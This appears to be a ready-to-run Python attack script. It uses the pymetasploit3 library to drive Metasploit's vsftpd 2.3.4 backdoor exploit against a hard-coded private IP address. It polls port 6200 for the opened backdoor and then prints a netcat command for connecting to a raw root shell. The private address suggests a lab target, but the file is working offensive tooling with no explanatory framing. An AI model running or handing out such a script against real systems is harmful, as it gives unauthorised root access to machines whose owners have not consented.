from pymetasploit3.msfrpc import MsfRpcClient
import time
import socket

# Configuration
TARGET_IP = '192.168.109.182'      # <-- Update with your target if needed
BACKDOOR_PORT = 6200               # Port vsftpd opens a root shell on

# Function to check if the backdoor port is open
def is_backdoor_open(ip, port=6200):
    try:
        with socket.create_connection((ip, port), timeout=5) as sock:
            return True
    except Exception:
        return False

# Main Exploit Logic
def run_vsftpd_exploit():
    print("[*] Connecting to Metasploit RPC...")
    try:
        client = MsfRpcClient(password='msf', server='127.0.0.1', port=55553, ssl=False)
    except Exception as e:
        print(f"[!] Failed to connect: {e}")
        return

    print("[*] Connected to Metasploit RPC")

    # Load exploit module
    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    exploit['RHOSTS'] = TARGET_IP

    # Launch the exploit
    print("[*] Launching vsftpd_234_backdoor exploit...")
    result = exploit.execute()
    print(f"[*] Exploit result: {result}")

    # Retry detection loop
    print("[*] Waiting for backdoor to initialize and checking port 6200...")
    for attempt in range(1, 11):
        time.sleep(2)
        print(f"[*] Attempt {attempt}: Scanning port {BACKDOOR_PORT} on {TARGET_IP}...")
        if is_backdoor_open(TARGET_IP, BACKDOOR_PORT):
            print(f"[+] Backdoor successfully opened on attempt {attempt}!")
            print(f"[!] You now have a raw root shell. Connect using:")
            print(f"    nc -nv {TARGET_IP} {BACKDOOR_PORT}")
            return
    print("[!] No backdoor detected after 10 attempts. Exploit may have failed or been blocked.")

# Entry Point
if __name__ == "__main__":
    run_vsftpd_exploit()









